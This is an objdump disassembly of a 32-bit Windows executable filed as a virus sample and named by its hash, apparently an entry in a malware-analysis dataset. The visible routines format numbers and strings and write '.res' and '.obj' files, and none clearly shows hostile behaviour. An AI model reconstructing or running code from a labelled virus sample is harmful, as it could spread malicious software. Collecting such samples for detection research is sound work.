
malware_samples/virus/310d23fb307ddb4488c260bac761a30419523c8d510f7f9bf3732e25a9cdabab.exe:     file format pei-i386


Disassembly of section code:

00401000 <code>:
  401000:	b9 08 00 00 00       	mov    $0x8,%ecx
  401005:	c1 c0 04             	rol    $0x4,%eax
  401008:	88 c2                	mov    %al,%dl
  40100a:	83 e2 0f             	and    $0xf,%edx
  40100d:	38 ea                	cmp    %ch,%dl
  40100f:	75 0f                	jne    0x401020
  401011:	e2 f2                	loop   0x401005
  401013:	c6 07 30             	movb   $0x30,(%edi)
  401016:	47                   	inc    %edi
  401017:	c3                   	ret
  401018:	c1 c0 04             	rol    $0x4,%eax
  40101b:	88 c2                	mov    %al,%dl
  40101d:	83 e2 0f             	and    $0xf,%edx
  401020:	8a 92 10 a9 40 00    	mov    0x40a910(%edx),%dl
  401026:	88 17                	mov    %dl,(%edi)
  401028:	47                   	inc    %edi
  401029:	e2 ed                	loop   0x401018
  40102b:	c3                   	ret
  40102c:	50                   	push   %eax
  40102d:	52                   	push   %edx
  40102e:	51                   	push   %ecx
  40102f:	53                   	push   %ebx
  401030:	31 d2                	xor    %edx,%edx
  401032:	31 c9                	xor    %ecx,%ecx
  401034:	bb 0a 00 00 00       	mov    $0xa,%ebx
  401039:	f7 f3                	div    %ebx
  40103b:	52                   	push   %edx
  40103c:	41                   	inc    %ecx
  40103d:	31 d2                	xor    %edx,%edx
  40103f:	39 d0                	cmp    %edx,%eax
  401041:	75 f6                	jne    0x401039
  401043:	58                   	pop    %eax
  401044:	04 30                	add    $0x30,%al
  401046:	aa                   	stos   %al,%es:(%edi)
  401047:	e2 fa                	loop   0x401043
  401049:	5b                   	pop    %ebx
  40104a:	59                   	pop    %ecx
  40104b:	5a                   	pop    %edx
  40104c:	58                   	pop    %eax
  40104d:	c3                   	ret
  40104e:	ac                   	lods   %ds:(%esi),%al
  40104f:	3c 00                	cmp    $0x0,%al
  401051:	74 03                	je     0x401056
  401053:	aa                   	stos   %al,%es:(%edi)
  401054:	eb f8                	jmp    0x40104e
  401056:	c3                   	ret
  401057:	31 c9                	xor    %ecx,%ecx
  401059:	b1 02                	mov    $0x2,%cl
  40105b:	ba 70 90 40 00       	mov    $0x409070,%edx
  401060:	f6 05 c4 ab 40 00 04 	testb  $0x4,0x40abc4
  401067:	75 0f                	jne    0x401078
  401069:	ba 72 90 40 00       	mov    $0x409072,%edx
  40106e:	41                   	inc    %ecx
  40106f:	f6 05 c4 ab 40 00 02 	testb  $0x2,0x40abc4
  401076:	74 14                	je     0x40108c
  401078:	6a 00                	push   $0x0
  40107a:	68 00 90 40 00       	push   $0x409000
  40107f:	51                   	push   %ecx
  401080:	52                   	push   %edx
  401081:	ff 35 64 90 40 00    	push   0x409064
  401087:	e8 74 0f 01 00       	call   0x412000
  40108c:	c3                   	ret
  40108d:	bf c0 df 40 00       	mov    $0x40dfc0,%edi
  401092:	b9 00 10 00 00       	mov    $0x1000,%ecx
  401097:	57                   	push   %edi
  401098:	eb 0c                	jmp    0x4010a6
  40109a:	e8 ae 3f 00 00       	call   0x40504d
  40109f:	83 e9 02             	sub    $0x2,%ecx
  4010a2:	76 06                	jbe    0x4010aa
  4010a4:	66 ab                	stos   %ax,%es:(%edi)
  4010a6:	09 db                	or     %ebx,%ebx
  4010a8:	75 f0                	jne    0x40109a
  4010aa:	89 fb                	mov    %edi,%ebx
  4010ac:	5f                   	pop    %edi
  4010ad:	29 fb                	sub    %edi,%ebx
  4010af:	c3                   	ret
  4010b0:	8f 05 04 90 40 00    	pop    0x409004
  4010b6:	f6 05 c4 ab 40 00 40 	testb  $0x40,0x40abc4
  4010bd:	75 51                	jne    0x401110
  4010bf:	ff 74 24 10          	push   0x10(%esp)
  4010c3:	ff 74 24 10          	push   0x10(%esp)
  4010c7:	ff 74 24 10          	push   0x10(%esp)
  4010cb:	ff 74 24 10          	push   0x10(%esp)
  4010cf:	ff 74 24 10          	push   0x10(%esp)
  4010d3:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  4010da:	75 07                	jne    0x4010e3
  4010dc:	e8 25 0f 01 00       	call   0x412006
  4010e1:	eb 1d                	jmp    0x401100
  4010e3:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4010e7:	8b 74 24 04          	mov    0x4(%esp),%esi
  4010eb:	e8 9d ff ff ff       	call   0x40108d
  4010f0:	d1 eb                	shr    $1,%ebx
  4010f2:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4010f6:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4010fa:	ff 15 4c 90 40 00    	call   *0x40904c
  401100:	09 c0                	or     %eax,%eax
  401102:	75 31                	jne    0x401135
  401104:	e8 4e ff ff ff       	call   0x401057
  401109:	80 0d c4 ab 40 00 40 	orb    $0x40,0x40abc4
  401110:	f6 05 c4 ab 40 00 04 	testb  $0x4,0x40abc4
  401117:	74 15                	je     0x40112e
  401119:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40111d:	8b 74 24 04          	mov    0x4(%esp),%esi
  401121:	e8 67 ff ff ff       	call   0x40108d
  401126:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  40112a:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40112e:	e8 cd 0e 01 00       	call   0x412000
  401133:	eb 03                	jmp    0x401138
  401135:	83 c4 14             	add    $0x14,%esp
  401138:	ff 35 04 90 40 00    	push   0x409004
  40113e:	c3                   	ret
  40113f:	f6 05 7d 90 40 00 05 	testb  $0x5,0x40907d
  401146:	75 72                	jne    0x4011ba
  401148:	f6 05 7d 90 40 00 80 	testb  $0x80,0x40907d
  40114f:	75 05                	jne    0x401156
  401151:	e8 06 01 00 00       	call   0x40125c
  401156:	83 3d 78 90 40 00 00 	cmpl   $0x0,0x409078
  40115d:	75 24                	jne    0x401183
  40115f:	f6 05 7e 90 40 00 08 	testb  $0x8,0x40907e
  401166:	75 1b                	jne    0x401183
  401168:	52                   	push   %edx
  401169:	6a 00                	push   $0x0
  40116b:	68 00 90 40 00       	push   $0x409000
  401170:	6a 0a                	push   $0xa
  401172:	68 ab a8 40 00       	push   $0x40a8ab
  401177:	ff 35 64 90 40 00    	push   0x409064
  40117d:	e8 2e ff ff ff       	call   0x4010b0
  401182:	5a                   	pop    %edx
  401183:	bf c0 f2 40 00       	mov    $0x40f2c0,%edi
  401188:	89 d6                	mov    %edx,%esi
  40118a:	e8 bf fe ff ff       	call   0x40104e
  40118f:	b0 0a                	mov    $0xa,%al
  401191:	38 47 ff             	cmp    %al,-0x1(%edi)
  401194:	74 06                	je     0x40119c
  401196:	66 b8 0d 0a          	mov    $0xa0d,%ax
  40119a:	66 ab                	stos   %ax,%es:(%edi)
  40119c:	81 ef c0 f2 40 00    	sub    $0x40f2c0,%edi
  4011a2:	6a 00                	push   $0x0
  4011a4:	68 00 90 40 00       	push   $0x409000
  4011a9:	57                   	push   %edi
  4011aa:	68 c0 f2 40 00       	push   $0x40f2c0
  4011af:	ff 35 64 90 40 00    	push   0x409064
  4011b5:	e8 f6 fe ff ff       	call   0x4010b0
  4011ba:	ff 05 78 90 40 00    	incl   0x409078
  4011c0:	c3                   	ret
  4011c1:	bf c0 f2 40 00       	mov    $0x40f2c0,%edi
  4011c6:	e8 83 fe ff ff       	call   0x40104e
  4011cb:	be c0 d9 40 00       	mov    $0x40d9c0,%esi
  4011d0:	e8 79 fe ff ff       	call   0x40104e
  4011d5:	b0 29                	mov    $0x29,%al
  4011d7:	b4 0d                	mov    $0xd,%ah
  4011d9:	66 ab                	stos   %ax,%es:(%edi)
  4011db:	b0 0a                	mov    $0xa,%al
  4011dd:	30 e4                	xor    %ah,%ah
  4011df:	66 ab                	stos   %ax,%es:(%edi)
  4011e1:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  4011e6:	e8 54 ff ff ff       	call   0x40113f
  4011eb:	c3                   	ret
  4011ec:	f6 05 7d 90 40 00 03 	testb  $0x3,0x40907d
  4011f3:	75 66                	jne    0x40125b
  4011f5:	52                   	push   %edx
  4011f6:	bf c0 f2 40 00       	mov    $0x40f2c0,%edi
  4011fb:	be 59 a8 40 00       	mov    $0x40a859,%esi
  401200:	e8 49 fe ff ff       	call   0x40104e
  401205:	5a                   	pop    %edx
  401206:	89 d6                	mov    %edx,%esi
  401208:	e8 41 fe ff ff       	call   0x40104e
  40120d:	81 fa c0 dd 40 00    	cmp    $0x40ddc0,%edx
  401213:	75 22                	jne    0x401237
  401215:	be 67 a8 40 00       	mov    $0x40a867,%esi
  40121a:	e8 2f fe ff ff       	call   0x40104e
  40121f:	be 05 a9 40 00       	mov    $0x40a905,%esi
  401224:	f6 05 7f 90 40 00 01 	testb  $0x1,0x40907f
  40122b:	74 05                	je     0x401232
  40122d:	be 0b a9 40 00       	mov    $0x40a90b,%esi
  401232:	e8 17 fe ff ff       	call   0x40104e
  401237:	66 b8 0d 0a          	mov    $0xa0d,%ax
  40123b:	66 ab                	stos   %ax,%es:(%edi)
  40123d:	81 ef c0 f2 40 00    	sub    $0x40f2c0,%edi
  401243:	6a 00                	push   $0x0
  401245:	68 00 90 40 00       	push   $0x409000
  40124a:	57                   	push   %edi
  40124b:	68 c0 f2 40 00       	push   $0x40f2c0
  401250:	ff 35 64 90 40 00    	push   0x409064
  401256:	e8 55 fe ff ff       	call   0x4010b0
  40125b:	c3                   	ret
  40125c:	51                   	push   %ecx
  40125d:	57                   	push   %edi
  40125e:	52                   	push   %edx
  40125f:	f6 05 7d 90 40 00 03 	testb  $0x3,0x40907d
  401266:	75 36                	jne    0x40129e
  401268:	f6 05 7d 90 40 00 80 	testb  $0x80,0x40907d
  40126f:	75 2d                	jne    0x40129e
  401271:	bf c0 f2 40 00       	mov    $0x40f2c0,%edi
  401276:	81 c7 00 04 00 00    	add    $0x400,%edi
  40127c:	89 fa                	mov    %edi,%edx
  40127e:	be 08 a8 40 00       	mov    $0x40a808,%esi
  401283:	e8 c6 fd ff ff       	call   0x40104e
  401288:	29 d7                	sub    %edx,%edi
  40128a:	6a 00                	push   $0x0
  40128c:	68 00 90 40 00       	push   $0x409000
  401291:	57                   	push   %edi
  401292:	52                   	push   %edx
  401293:	ff 35 64 90 40 00    	push   0x409064
  401299:	e8 12 fe ff ff       	call   0x4010b0
  40129e:	80 0d 7d 90 40 00 80 	orb    $0x80,0x40907d
  4012a5:	5a                   	pop    %edx
  4012a6:	5f                   	pop    %edi
  4012a7:	59                   	pop    %ecx
  4012a8:	c3                   	ret
  4012a9:	8b 73 08             	mov    0x8(%ebx),%esi
  4012ac:	ff 73 0c             	push   0xc(%ebx)
  4012af:	56                   	push   %esi
  4012b0:	e8 57 0d 01 00       	call   0x41200c
  4012b5:	09 c0                	or     %eax,%eax
  4012b7:	75 19                	jne    0x4012d2
  4012b9:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  4012bc:	e3 14                	jecxz  0x4012d2
  4012be:	b8 c0 f2 40 00       	mov    $0x40f2c0,%eax
  4012c3:	05 00 08 00 00       	add    $0x800,%eax
  4012c8:	29 f8                	sub    %edi,%eax
  4012ca:	72 06                	jb     0x4012d2
  4012cc:	39 c1                	cmp    %eax,%ecx
  4012ce:	77 02                	ja     0x4012d2
  4012d0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4012d2:	c3                   	ret
  4012d3:	50                   	push   %eax
  4012d4:	c1 e8 10             	shr    $0x10,%eax
  4012d7:	c7 07 4c 69 6e 65    	movl   $0x656e694c,(%edi)
  4012dd:	c6 47 04 20          	movb   $0x20,0x4(%edi)
  4012e1:	83 c7 05             	add    $0x5,%edi
  4012e4:	e8 43 fd ff ff       	call   0x40102c
  4012e9:	58                   	pop    %eax
  4012ea:	be 97 a8 40 00       	mov    $0x40a897,%esi
  4012ef:	e8 37 1a 00 00       	call   0x402d2b
  4012f4:	74 17                	je     0x40130d
  4012f6:	80 38 07             	cmpb   $0x7,(%eax)
  4012f9:	77 34                	ja     0x40132f
  4012fb:	89 c3                	mov    %eax,%ebx
  4012fd:	be c6 a8 40 00       	mov    $0x40a8c6,%esi
  401302:	e8 47 fd ff ff       	call   0x40104e
  401307:	e8 9d ff ff ff       	call   0x4012a9
  40130c:	c3                   	ret
  40130d:	e8 3c fd ff ff       	call   0x40104e
  401312:	66 b8 20 28          	mov    $0x2820,%ax
  401316:	66 ab                	stos   %ax,%es:(%edi)
  401318:	be c0 d9 40 00       	mov    $0x40d9c0,%esi
  40131d:	8b 0d e0 a9 40 00    	mov    0x40a9e0,%ecx
  401323:	29 f1                	sub    %esi,%ecx
  401325:	76 02                	jbe    0x401329
  401327:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401329:	b8 2e 52 43 29       	mov    $0x2943522e,%eax
  40132e:	ab                   	stos   %eax,%es:(%edi)
  40132f:	c3                   	ret
  401330:	53                   	push   %ebx
  401331:	09 db                	or     %ebx,%ebx
  401333:	74 2e                	je     0x401363
  401335:	8b 5b 10             	mov    0x10(%ebx),%ebx
  401338:	81 3b 00 00 00 01    	cmpl   $0x1000000,(%ebx)
  40133e:	72 23                	jb     0x401363
  401340:	be ea a8 40 00       	mov    $0x40a8ea,%esi
  401345:	e8 04 fd ff ff       	call   0x40104e
  40134a:	66 b8 61 74          	mov    $0x7461,%ax
  40134e:	66 ab                	stos   %ax,%es:(%edi)
  401350:	b0 20                	mov    $0x20,%al
  401352:	aa                   	stos   %al,%es:(%edi)
  401353:	53                   	push   %ebx
  401354:	8b 43 14             	mov    0x14(%ebx),%eax
  401357:	e8 77 ff ff ff       	call   0x4012d3
  40135c:	5b                   	pop    %ebx
  40135d:	66 b8 0d 0a          	mov    $0xa0d,%ax
  401361:	66 ab                	stos   %ax,%es:(%edi)
  401363:	5b                   	pop    %ebx
  401364:	c3                   	ret
  401365:	53                   	push   %ebx
  401366:	be dc a8 40 00       	mov    $0x40a8dc,%esi
  40136b:	e8 de fc ff ff       	call   0x40104e
  401370:	8b 5b 10             	mov    0x10(%ebx),%ebx
  401373:	be b6 a8 40 00       	mov    $0x40a8b6,%esi
  401378:	83 c6 03             	add    $0x3,%esi
  40137b:	66 83 7b 14 01       	cmpw   $0x1,0x14(%ebx)
  401380:	74 0c                	je     0x40138e
  401382:	8b 43 14             	mov    0x14(%ebx),%eax
  401385:	53                   	push   %ebx
  401386:	e8 48 ff ff ff       	call   0x4012d3
  40138b:	5b                   	pop    %ebx
  40138c:	eb 05                	jmp    0x401393
  40138e:	e8 bb fc ff ff       	call   0x40104e
  401393:	b8 20 61 73 3a       	mov    $0x3a736120,%eax
  401398:	ab                   	stos   %eax,%es:(%edi)
  401399:	66 b8 0d 0a          	mov    $0xa0d,%ax
  40139d:	66 ab                	stos   %ax,%es:(%edi)
  40139f:	8b 43 1c             	mov    0x1c(%ebx),%eax
  4013a2:	83 7b 0c 01          	cmpl   $0x1,0xc(%ebx)
  4013a6:	72 15                	jb     0x4013bd
  4013a8:	75 0a                	jne    0x4013b4
  4013aa:	e8 51 fc ff ff       	call   0x401000
  4013af:	b0 68                	mov    $0x68,%al
  4013b1:	aa                   	stos   %al,%es:(%edi)
  4013b2:	eb 09                	jmp    0x4013bd
  4013b4:	89 c6                	mov    %eax,%esi
  4013b6:	8b 4b 18             	mov    0x18(%ebx),%ecx
  4013b9:	e3 02                	jecxz  0x4013bd
  4013bb:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4013bd:	66 b8 0d 0a          	mov    $0xa0d,%ax
  4013c1:	66 ab                	stos   %ax,%es:(%edi)
  4013c3:	5b                   	pop    %ebx
  4013c4:	c3                   	ret
  4013c5:	51                   	push   %ecx
  4013c6:	52                   	push   %edx
  4013c7:	50                   	push   %eax
  4013c8:	be b6 a8 40 00       	mov    $0x40a8b6,%esi
  4013cd:	66 83 7b 04 01       	cmpw   $0x1,0x4(%ebx)
  4013d2:	74 14                	je     0x4013e8
  4013d4:	f7 03 00 00 01 00    	testl  $0x10000,(%ebx)
  4013da:	75 1d                	jne    0x4013f9
  4013dc:	8b 43 04             	mov    0x4(%ebx),%eax
  4013df:	53                   	push   %ebx
  4013e0:	e8 ee fe ff ff       	call   0x4012d3
  4013e5:	5b                   	pop    %ebx
  4013e6:	eb 05                	jmp    0x4013ed
  4013e8:	e8 61 fc ff ff       	call   0x40104e
  4013ed:	66 b8 3a 2d          	mov    $0x2d3a,%ax
  4013f1:	66 ab                	stos   %ax,%es:(%edi)
  4013f3:	66 b8 0d 0a          	mov    $0xa0d,%ax
  4013f7:	66 ab                	stos   %ax,%es:(%edi)
  4013f9:	58                   	pop    %eax
  4013fa:	8b 34 85 34 a6 40 00 	mov    0x40a634(,%eax,4),%esi
  401401:	6a 14                	push   $0x14
  401403:	56                   	push   %esi
  401404:	e8 03 0c 01 00       	call   0x41200c
  401409:	09 c0                	or     %eax,%eax
  40140b:	75 17                	jne    0x401424
  40140d:	e8 3c fc ff ff       	call   0x40104e
  401412:	be 31 96 40 00       	mov    $0x409631,%esi
  401417:	f7 03 00 20 00 00    	testl  $0x2000,(%ebx)
  40141d:	74 05                	je     0x401424
  40141f:	e8 2a fc ff ff       	call   0x40104e
  401424:	66 b8 0d 0a          	mov    $0xa0d,%ax
  401428:	66 ab                	stos   %ax,%es:(%edi)
  40142a:	f7 03 00 10 00 00    	testl  $0x1000,(%ebx)
  401430:	75 0b                	jne    0x40143d
  401432:	e8 72 fe ff ff       	call   0x4012a9
  401437:	66 b8 0d 0a          	mov    $0xa0d,%ax
  40143b:	66 ab                	stos   %ax,%es:(%edi)
  40143d:	f7 03 00 00 02 00    	testl  $0x20000,(%ebx)
  401443:	74 07                	je     0x40144c
  401445:	e8 1b ff ff ff       	call   0x401365
  40144a:	eb 0d                	jmp    0x401459
  40144c:	f7 03 00 00 04 00    	testl  $0x40000,(%ebx)
  401452:	74 05                	je     0x401459
  401454:	e8 d7 fe ff ff       	call   0x401330
  401459:	66 b8 0d 0a          	mov    $0xa0d,%ax
  40145d:	66 ab                	stos   %ax,%es:(%edi)
  40145f:	5a                   	pop    %edx
  401460:	59                   	pop    %ecx
  401461:	c3                   	ret
  401462:	bf c0 f2 40 00       	mov    $0x40f2c0,%edi
  401467:	89 fa                	mov    %edi,%edx
  401469:	81 c2 80 06 00 00    	add    $0x680,%edx
  40146f:	be 71 a8 40 00       	mov    $0x40a871,%esi
  401474:	f7 c1 00 08 00 00    	test   $0x800,%ecx
  40147a:	74 10                	je     0x40148c
  40147c:	be ab a8 40 00       	mov    $0x40a8ab,%esi
  401481:	83 3d 78 90 40 00 00 	cmpl   $0x0,0x409078
  401488:	74 02                	je     0x40148c
  40148a:	46                   	inc    %esi
  40148b:	46                   	inc    %esi
  40148c:	e8 bd fb ff ff       	call   0x40104e
  401491:	c7 05 78 90 40 00 00 	movl   $0x0,0x409078
  401498:	00 00 00 
  40149b:	8b 1d 64 aa 40 00    	mov    0x40aa64,%ebx
  4014a1:	3b 1d 68 aa 40 00    	cmp    0x40aa68,%ebx
  4014a7:	73 3b                	jae    0x4014e4
  4014a9:	8b 03                	mov    (%ebx),%eax
  4014ab:	83 f8 04             	cmp    $0x4,%eax
  4014ae:	76 26                	jbe    0x4014d6
  4014b0:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  4014b5:	77 22                	ja     0x4014d9
  4014b7:	85 c8                	test   %ecx,%eax
  4014b9:	74 1e                	je     0x4014d9
  4014bb:	25 ff 03 00 00       	and    $0x3ff,%eax
  4014c0:	83 e8 20             	sub    $0x20,%eax
  4014c3:	72 14                	jb     0x4014d9
  4014c5:	39 d7                	cmp    %edx,%edi
  4014c7:	73 15                	jae    0x4014de
  4014c9:	e8 f7 fe ff ff       	call   0x4013c5
  4014ce:	ff 05 78 90 40 00    	incl   0x409078
  4014d4:	eb 03                	jmp    0x4014d9
  4014d6:	83 c3 20             	add    $0x20,%ebx
  4014d9:	83 c3 20             	add    $0x20,%ebx
  4014dc:	eb c3                	jmp    0x4014a1
  4014de:	66 b8 0d 0a          	mov    $0xa0d,%ax
  4014e2:	66 ab                	stos   %ax,%es:(%edi)
  4014e4:	83 3d 78 90 40 00 01 	cmpl   $0x1,0x409078
  4014eb:	72 4e                	jb     0x40153b
  4014ed:	f7 c1 00 08 00 00    	test   $0x800,%ecx
  4014f3:	75 1f                	jne    0x401514
  4014f5:	f6 05 7d 90 40 00 09 	testb  $0x9,0x40907d
  4014fc:	75 3d                	jne    0x40153b
  4014fe:	83 3d 78 90 40 00 01 	cmpl   $0x1,0x409078
  401505:	77 16                	ja     0x40151d
  401507:	b8 c0 f2 40 00       	mov    $0x40f2c0,%eax
  40150c:	66 c7 40 09 20 2e    	movw   $0x2e20,0x9(%eax)
  401512:	eb 09                	jmp    0x40151d
  401514:	f6 05 7d 90 40 00 05 	testb  $0x5,0x40907d
  40151b:	75 1e                	jne    0x40153b
  40151d:	81 ef c0 f2 40 00    	sub    $0x40f2c0,%edi
  401523:	6a 00                	push   $0x0
  401525:	68 00 90 40 00       	push   $0x409000
  40152a:	57                   	push   %edi
  40152b:	68 c0 f2 40 00       	push   $0x40f2c0
  401530:	ff 35 64 90 40 00    	push   0x409064
  401536:	e8 75 fb ff ff       	call   0x4010b0
  40153b:	c3                   	ret
  40153c:	f6 05 7e 90 40 00 10 	testb  $0x10,0x40907e
  401543:	75 31                	jne    0x401576
  401545:	be c0 d9 40 00       	mov    $0x40d9c0,%esi
  40154a:	8b 0d e0 a9 40 00    	mov    0x40a9e0,%ecx
  401550:	29 f1                	sub    %esi,%ecx
  401552:	76 07                	jbe    0x40155b
  401554:	bf c0 db 40 00       	mov    $0x40dbc0,%edi
  401559:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40155b:	8a 47 ff             	mov    -0x1(%edi),%al
  40155e:	ba 2e 72 65 73       	mov    $0x7365722e,%edx
  401563:	3c 5a                	cmp    $0x5a,%al
  401565:	77 09                	ja     0x401570
  401567:	3c 41                	cmp    $0x41,%al
  401569:	72 05                	jb     0x401570
  40156b:	ba 2e 52 45 53       	mov    $0x5345522e,%edx
  401570:	89 17                	mov    %edx,(%edi)
  401572:	c6 47 04 00          	movb   $0x0,0x4(%edi)
  401576:	ba c0 db 40 00       	mov    $0x40dbc0,%edx
  40157b:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  401582:	75 09                	jne    0x40158d
  401584:	f6 05 c4 ab 40 00 10 	testb  $0x10,0x40abc4
  40158b:	74 05                	je     0x401592
  40158d:	e8 43 06 00 00       	call   0x401bd5
  401592:	6a 00                	push   $0x0
  401594:	68 80 00 00 00       	push   $0x80
  401599:	6a 02                	push   $0x2
  40159b:	6a 00                	push   $0x0
  40159d:	6a 01                	push   $0x1
  40159f:	68 00 00 00 c0       	push   $0xc0000000
  4015a4:	52                   	push   %edx
  4015a5:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  4015ac:	74 08                	je     0x4015b6
  4015ae:	ff 15 50 90 40 00    	call   *0x409050
  4015b4:	eb 05                	jmp    0x4015bb
  4015b6:	e8 57 0a 01 00       	call   0x412012
  4015bb:	83 f8 ff             	cmp    $0xffffffff,%eax
  4015be:	75 02                	jne    0x4015c2
  4015c0:	f9                   	stc
  4015c1:	c3                   	ret
  4015c2:	89 c6                	mov    %eax,%esi
  4015c4:	6a 00                	push   $0x0
  4015c6:	6a 00                	push   $0x0
  4015c8:	6a 00                	push   $0x0
  4015ca:	56                   	push   %esi
  4015cb:	e8 48 0a 01 00       	call   0x412018
  4015d0:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  4015d5:	2b 05 70 aa 40 00    	sub    0x40aa70,%eax
  4015db:	76 36                	jbe    0x401613
  4015dd:	6a 00                	push   $0x0
  4015df:	68 00 90 40 00       	push   $0x409000
  4015e4:	50                   	push   %eax
  4015e5:	ff 35 70 aa 40 00    	push   0x40aa70
  4015eb:	56                   	push   %esi
  4015ec:	e8 0f 0a 01 00       	call   0x412000
  4015f1:	09 c0                	or     %eax,%eax
  4015f3:	74 1e                	je     0x401613
  4015f5:	56                   	push   %esi
  4015f6:	e8 23 0a 01 00       	call   0x41201e
  4015fb:	56                   	push   %esi
  4015fc:	e8 23 0a 01 00       	call   0x412024
  401601:	ba c0 db 40 00       	mov    $0x40dbc0,%edx
  401606:	e8 e1 fb ff ff       	call   0x4011ec
  40160b:	80 25 7e 90 40 00 fe 	andb   $0xfe,0x40907e
  401612:	c3                   	ret
  401613:	56                   	push   %esi
  401614:	e8 0b 0a 01 00       	call   0x412024
  401619:	f9                   	stc
  40161a:	c3                   	ret
  40161b:	f6 05 7e 90 40 00 20 	testb  $0x20,0x40907e
  401622:	75 31                	jne    0x401655
  401624:	bf c0 dd 40 00       	mov    $0x40ddc0,%edi
  401629:	be c0 d9 40 00       	mov    $0x40d9c0,%esi
  40162e:	8b 0d e0 a9 40 00    	mov    0x40a9e0,%ecx
  401634:	29 f1                	sub    %esi,%ecx
  401636:	76 02                	jbe    0x40163a
  401638:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40163a:	8a 47 ff             	mov    -0x1(%edi),%al
  40163d:	ba 2e 6f 62 6a       	mov    $0x6a626f2e,%edx
  401642:	3c 5a                	cmp    $0x5a,%al
  401644:	77 09                	ja     0x40164f
  401646:	3c 41                	cmp    $0x41,%al
  401648:	72 05                	jb     0x40164f
  40164a:	ba 2e 4f 42 4a       	mov    $0x4a424f2e,%edx
  40164f:	89 17                	mov    %edx,(%edi)
  401651:	c6 47 04 00          	movb   $0x0,0x4(%edi)
  401655:	ba c0 dd 40 00       	mov    $0x40ddc0,%edx
  40165a:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  401661:	75 09                	jne    0x40166c
  401663:	f6 05 c4 ab 40 00 10 	testb  $0x10,0x40abc4
  40166a:	74 05                	je     0x401671
  40166c:	e8 64 05 00 00       	call   0x401bd5
  401671:	6a 00                	push   $0x0
  401673:	68 80 00 00 00       	push   $0x80
  401678:	6a 02                	push   $0x2
  40167a:	6a 00                	push   $0x0
  40167c:	6a 01                	push   $0x1
  40167e:	68 00 00 00 c0       	push   $0xc0000000
  401683:	52                   	push   %edx
  401684:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  40168b:	74 08                	je     0x401695
  40168d:	ff 15 50 90 40 00    	call   *0x409050
  401693:	eb 05                	jmp    0x40169a
  401695:	e8 78 09 01 00       	call   0x412012
  40169a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40169d:	75 02                	jne    0x4016a1
  40169f:	f9                   	stc
  4016a0:	c3                   	ret
  4016a1:	89 c6                	mov    %eax,%esi
  4016a3:	6a 00                	push   $0x0
  4016a5:	6a 00                	push   $0x0
  4016a7:	6a 00                	push   $0x0
  4016a9:	56                   	push   %esi
  4016aa:	e8 69 09 01 00       	call   0x412018
  4016af:	a1 0c 90 40 00       	mov    0x40900c,%eax
  4016b4:	2b 05 08 90 40 00    	sub    0x409008,%eax
  4016ba:	6a 00                	push   $0x0
  4016bc:	68 00 90 40 00       	push   $0x409000
  4016c1:	50                   	push   %eax
  4016c2:	ff 35 08 90 40 00    	push   0x409008
  4016c8:	56                   	push   %esi
  4016c9:	e8 32 09 01 00       	call   0x412000
  4016ce:	a1 18 90 40 00       	mov    0x409018,%eax
  4016d3:	2b 05 10 90 40 00    	sub    0x409010,%eax
  4016d9:	6a 00                	push   $0x0
  4016db:	68 00 90 40 00       	push   $0x409000
  4016e0:	50                   	push   %eax
  4016e1:	ff 35 10 90 40 00    	push   0x409010
  4016e7:	56                   	push   %esi
  4016e8:	e8 13 09 01 00       	call   0x412000
  4016ed:	56                   	push   %esi
  4016ee:	e8 2b 09 01 00       	call   0x41201e
  4016f3:	56                   	push   %esi
  4016f4:	e8 2b 09 01 00       	call   0x412024
  4016f9:	ba c0 dd 40 00       	mov    $0x40ddc0,%edx
  4016fe:	e8 e9 fa ff ff       	call   0x4011ec
  401703:	80 25 7e 90 40 00 fd 	andb   $0xfd,0x40907e
  40170a:	c3                   	ret
  40170b:	e3 09                	jecxz  0x401716
  40170d:	80 3f 20             	cmpb   $0x20,(%edi)
  401710:	75 04                	jne    0x401716
  401712:	47                   	inc    %edi
  401713:	49                   	dec    %ecx
  401714:	75 f7                	jne    0x40170d
  401716:	c3                   	ret
  401717:	83 c7 02             	add    $0x2,%edi
  40171a:	83 e9 02             	sub    $0x2,%ecx
  40171d:	76 7d                	jbe    0x40179c
  40171f:	e8 28 6d 00 00       	call   0x40844c
  401724:	72 55                	jb     0x40177b
  401726:	89 15 00 90 40 00    	mov    %edx,0x409000
  40172c:	c7 42 1c 01 00 00 00 	movl   $0x1,0x1c(%edx)
  401733:	c7 42 0c 01 00 00 00 	movl   $0x1,0xc(%edx)
  40173a:	e8 cc ff ff ff       	call   0x40170b
  40173f:	74 5b                	je     0x40179c
  401741:	80 3f 3d             	cmpb   $0x3d,(%edi)
  401744:	75 46                	jne    0x40178c
  401746:	47                   	inc    %edi
  401747:	49                   	dec    %ecx
  401748:	74 52                	je     0x40179c
  40174a:	80 3f 3d             	cmpb   $0x3d,(%edi)
  40174d:	74 f7                	je     0x401746
  40174f:	e8 af 2b 00 00       	call   0x404303
  401754:	72 25                	jb     0x40177b
  401756:	ba 2b 08 01 01       	mov    $0x101082b,%edx
  40175b:	74 1e                	je     0x40177b
  40175d:	80 0d ca ab 40 00 40 	orb    $0x40,0x40abca
  401764:	e8 63 24 00 00       	call   0x403bcc
  401769:	ba 2b 08 01 01       	mov    $0x101082b,%edx
  40176e:	72 0b                	jb     0x40177b
  401770:	8b 15 00 90 40 00    	mov    0x409000,%edx
  401776:	89 42 1c             	mov    %eax,0x1c(%edx)
  401779:	eb 11                	jmp    0x40178c
  40177b:	e8 74 27 00 00       	call   0x403ef4
